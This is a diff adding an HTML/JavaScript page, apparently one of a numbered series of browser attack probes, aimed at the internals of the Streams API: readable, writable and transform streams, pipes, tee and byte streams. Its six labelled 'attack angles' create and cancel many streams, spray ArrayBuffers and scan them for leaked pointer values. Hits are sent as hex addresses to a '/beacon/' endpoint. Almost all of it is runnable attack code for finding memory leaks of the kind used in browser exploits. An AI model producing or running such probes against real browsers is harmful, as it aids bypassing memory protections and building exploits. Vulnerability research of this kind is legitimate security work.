@@ -1,0 +1,507 @@
+<!--
+  p795: ReadableStream / WritableStream / TransformStream pipe
+        operations and stream controller internal state residue
+
+  ReadableStream: C++ ReadableStream with ReadableStreamDefaultController
+  or ReadableByteStreamController. Each stream allocates a C++ queue,
+  pull/cancel algorithms, and reader state. The controller holds
+  pending pull requests and enqueued chunks.
+
+  WritableStream: C++ WritableStream with WritableStreamDefaultController.
+  write/close/abort algorithms and a write queue. Each pending write
+  allocates a C++ promise wrapper and queue entry.
+
+  TransformStream: bridges a ReadableStream and WritableStream via a
+  C++ TransformStreamDefaultController. The transformer's flush and
+  transform callbacks allocate C++ closure wrappers.
+
+  pipeTo/pipeThrough: connects streams via a C++ pipe algorithm that
+  allocates reader/writer pairs, promise chains, and abort signal
+  handlers. Cancelling mid-pipe exercises the teardown path.
+
+  ReadableStream.tee(): creates two C++ branch streams sharing one
+  source, with internal TeeReadableStreamBranch objects.
+
+  Attack angles:
+  A) ReadableStream with controller enqueue/close churn.
+  B) WritableStream with write queue pressure.
+  C) TransformStream transform/flush lifecycle.
+  D) pipeTo/pipeThrough with mid-pipe cancel.
+  E) ReadableStream.tee() branch lifecycle.
+  F) ReadableByteStreamController with BYOB readers.
+
+  CRASH_CLASS: LOW (Streams API, no side effects)
+  prior art: p785 (Shadow DOM/Template/Streams)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p795</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p795-START');
+
+// === Section A: ReadableStream controller enqueue/close churn ===
+try{
+  b('A-readable-stream');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var controllers=[];
+
+      for(var i=0;i<30;i++){
+        try{
+          var ctrl;
+          var rs=new ReadableStream({
+            start:function(c){ctrl=c;},
+            pull:function(c){},
+            cancel:function(reason){}
+          });
+
+          // Enqueue chunks then close
+          for(var j=0;j<20;j++){
+            try{ctrl.enqueue('chunk_'+i+'_'+j);}catch(e){break;}
+          }
+          try{ctrl.close();}catch(e){}
+
+          controllers.push(ctrl);
+
+          if(round===0&&i===0){
+            b('A desiredSize='+ctrl.desiredSize);
+          }
+        }catch(e){
+          if(i===0&&round===0)b('A rs_err='+e.message);
+        }
+      }
+
+      // Create and immediately cancel streams
+      for(var i=0;i<20;i++){
+        try{
+          var ctrl2;
+          var rs2=new ReadableStream({
+            start:function(c){ctrl2=c;},
+            pull:function(c){c.enqueue('data');},
+            cancel:function(reason){}
+          });
+          var reader=rs2.getReader();
+          reader.cancel('done');
+          reader.releaseLock();
+        }catch(e){}
+      }
+
+      if(round===0)b('A created '+controllers.length+' ReadableStreams with 20 enqueues each + 20 cancel cycles');
+      controllers=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[32,48,64,96,128]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: WritableStream write queue pressure ===
+try{
+  b('B-writable-stream');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var streams=[];
+
+      for(var i=0;i<25;i++){
+        try{
+          var writeCount=0;
+          var ws=new WritableStream({
+            write:function(chunk,controller){
+              writeCount++;
+              return new Promise(function(resolve){resolve();});
+            },
+            close:function(){},
+            abort:function(reason){}
+          },{
+            highWaterMark:5+i
+          });
+
+          var writer=ws.getWriter();
+
+          // Queue up writes
+          var promises=[];
+          for(var j=0;j<15;j++){
+            try{
+              promises.push(writer.write('data_'+i+'_'+j));
+            }catch(e){break;}
+          }
+
+          // Close
+          try{writer.close();}catch(e){}
+          try{writer.releaseLock();}catch(e){}
+
+          streams.push(ws);
+
+          if(round===0&&i===0){
+            b('B wrote '+promises.length+' chunks, writeCount='+writeCount);
+          }
+        }catch(e){
+          if(i===0&&round===0)b('B ws_err='+e.message);
+        }
+      }
+
+      // Create and immediately abort streams
+      for(var i=0;i<20;i++){
+        try{
+          var ws2=new WritableStream({
+            write:function(chunk){return new Promise(function(r){r();});},
+            close:function(){},
+            abort:function(reason){}
+          });
+          var w2=ws2.getWriter();
+          w2.write('before_abort');
+          w2.abort('cancelled');
+          w2.releaseLock();
+        }catch(e){}
+      }
+
+      if(round===0)b('B created '+streams.length+' WritableStreams with write pressure + 20 abort cycles');
+      streams=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96,128]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: TransformStream transform/flush lifecycle ===
+try{
+  b('C-transform-stream');
+  var cHits=0;
+
+  var tsSupported=typeof TransformStream!=='undefined';
+  if(!tsSupported){
+    b('C-SKIP no TransformStream');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var transforms=[];
+
+        for(var i=0;i<30;i++){
+          try{
+            var transformCount=0;
+            var ts=new TransformStream({
+              transform:function(chunk,controller){
+                transformCount++;
+                controller.enqueue(chunk.toUpperCase?chunk.toUpperCase():chunk);
+              },
+              flush:function(controller){
+                controller.enqueue('FLUSHED');
+              }
+            },{
+              highWaterMark:3
+            },{
+              highWaterMark:3
+            });
+
+            // Get writer and reader
+            var writer=ts.writable.getWriter();
+            var reader=ts.readable.getReader();
+
+            // Write data through transform
+            for(var j=0;j<10;j++){
+              try{writer.write('item_'+i+'_'+j);}catch(e){break;}
+            }
+            try{writer.close();}catch(e){}
+
+            // Read transformed data
+            var readDone=false;
+            for(var j=0;j<15&&!readDone;j++){
+              try{
+                // Can't await in sync, just trigger the read
+                reader.read().then(function(r){if(r.done)readDone=true;});
+              }catch(e){break;}
+            }
+
+            try{reader.releaseLock();}catch(e){}
+            try{writer.releaseLock();}catch(e){}
+
+            transforms.push(ts);
+
+            if(round===0&&i===0){
+              b('C transformCount='+transformCount);
+            }
+          }catch(e){
+            if(i===0&&round===0)b('C ts_err='+e.message);
+          }
+        }
+
+        if(round===0)b('C created '+transforms.length+' TransformStreams with 10 transforms each');
+        transforms=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      cHits+=sprayAndScan('C',round,[32,48,64,96,128]);
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: pipeTo/pipeThrough with mid-pipe cancel ===
+try{
+  b('D-pipe');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var pipeCount=0;
+
+      for(var i=0;i<20;i++){
+        try{
+          // Create source readable
+          var pullCount=0;
+          var sourceCtrl;
+          var source=new ReadableStream({
+            start:function(c){sourceCtrl=c;},
+            pull:function(c){
+              pullCount++;
+              if(pullCount<=10)c.enqueue('pull_'+pullCount);
+              else c.close();
+            }
+          });
+
+          // Create sink writable
+          var sinkWrites=0;
+          var sink=new WritableStream({
+            write:function(chunk){
+              sinkWrites++;
+              return new Promise(function(r){r();});
+            },
+            close:function(){},
+            abort:function(){}
+          });
+
+          // pipeTo (non-blocking, returns promise)
+          var abortCtrl;
+          try{abortCtrl=new AbortController();}catch(e){}
+
+          var pipeOpts={};
+          if(abortCtrl)pipeOpts.signal=abortCtrl.signal;
+
+          try{
+            source.pipeTo(sink,pipeOpts).catch(function(){});
+            pipeCount++;
+          }catch(e){}
+
+          // Abort mid-pipe for some
+          if(i%3===0&&abortCtrl){
+            try{abortCtrl.abort();}catch(e){}
+          }
+        }catch(e){
+          if(i===0&&round===0)b('D pipe_err='+e.message);
+        }
+      }
+
+      // pipeThrough with TransformStream
+      if(typeof TransformStream!=='undefined'){
+        for(var i=0;i<15;i++){
+          try{
+            var src=new ReadableStream({
+              start:function(c){
+                for(var k=0;k<5;k++)c.enqueue('v'+k);
+                c.close();
+              }
+            });
+
+            var ts=new TransformStream({
+              transform:function(chunk,c){c.enqueue(chunk+'_transformed');}
+            });
+
+            var piped=src.pipeThrough(ts);
+            var reader=piped.getReader();
+            // Trigger reads
+            for(var k=0;k<8;k++){
+              reader.read().then(function(){}).catch(function(){});
+            }
+            try{reader.releaseLock();}catch(e){}
+            pipeCount++;
+          }catch(e){}
+        }
+      }
+
+      if(round===0)b('D completed '+pipeCount+' pipe operations (pipeTo + pipeThrough)');
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    dHits+=sprayAndScan('D',round,[48,64,96,128]);
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: ReadableStream.tee() branch lifecycle ===
+try{
+  b('E-tee');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var teeCount=0;
+
+      for(var i=0;i<25;i++){
+        try{
+          var enqueueCount=0;
+          var ctrl;
+          var rs=new ReadableStream({
+            start:function(c){ctrl=c;},
+            pull:function(c){
+              enqueueCount++;
+              if(enqueueCount<=8)c.enqueue('tee_data_'+enqueueCount);
+              else c.close();
+            }
+          });
+
+          // Tee the stream
+          var branches=rs.tee();
+          teeCount++;
+
+          if(round===0&&i===0){
+            b('E tee branches='+branches.length);
+          }
+
+          // Read from both branches
+          var r1=branches[0].getReader();
+          var r2=branches[1].getReader();
+
+          for(var j=0;j<10;j++){
+            r1.read().then(function(){}).catch(function(){});
+            r2.read().then(function(){}).catch(function(){});
+          }
+
+          // Cancel one branch, keep reading other
+          try{r1.cancel('done_with_branch1');}catch(e){}
+          try{r1.releaseLock();}catch(e){}
+
+          for(var j=0;j<5;j++){
+            r2.read().then(function(){}).catch(function(){});
+          }
+          try{r2.cancel();}catch(e){}
+          try{r2.releaseLock();}catch(e){}
+
+        }catch(e){
+          if(i===0&&round===0)b('E tee_err='+e.message);
+        }
+      }
+
+      if(round===0)b('E created '+teeCount+' tee operations with branch cancel');
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96,128]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: ReadableByteStreamController with BYOB readers ===
+try{
+  b('F-byob');
+  var fHits=0;
+
+  var byobSupported=false;
+  try{
+    var testRs=new ReadableStream({type:'bytes',start:function(c){}});
+    byobSupported=true;
+  }catch(e){
+    b('F-SKIP no byte stream support: '+e.message);
+  }
+
+  if(byobSupported){
+    for(var round=0;round<5;round++){
+      (function(){
+        var byobCount=0;
+
+        for(var i=0;i<20;i++){
+          try{
+            var byteCtrl;
+            var rs=new ReadableStream({
+              type:'bytes',
+              start:function(c){byteCtrl=c;},
+              pull:function(c){
+                // Respond with bytes
+                if(c.byobRequest){
+                  var view=c.byobRequest.view;
+                  for(var k=0;k<view.byteLength;k++){
+                    view[k]=k&0xFF;
+                  }
+                  c.byobRequest.respond(view.byteLength);
+                }else{
+                  c.enqueue(new Uint8Array([1,2,3,4,5,6,7,8]));
+                }
+              },
+              cancel:function(){}
+            },{highWaterMark:0});
+
+            // Try BYOB reader
+            try{
+              var reader=rs.getReader({mode:'byob'});
+              for(var j=0;j<5;j++){
+                var buf=new ArrayBuffer(64);
+                var view=new Uint8Array(buf);
+                reader.read(view).then(function(r){}).catch(function(){});
+              }
+              reader.cancel();
+              reader.releaseLock();
+            }catch(e){
+              // Fall back to default reader
+              var reader=rs.getReader();
+              for(var j=0;j<5;j++){
+                reader.read().then(function(){}).catch(function(){});
+              }
+              reader.cancel();
+              reader.releaseLock();
+            }
+
+            byobCount++;
+          }catch(e){
+            if(i===0&&round===0)b('F byob_err='+e.message);
+          }
+        }
+
+        if(round===0)b('F created '+byobCount+' byte streams with BYOB reads');
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      fHits+=sprayAndScan('F',round,[32,48,64,96,128,192]);
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p795-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
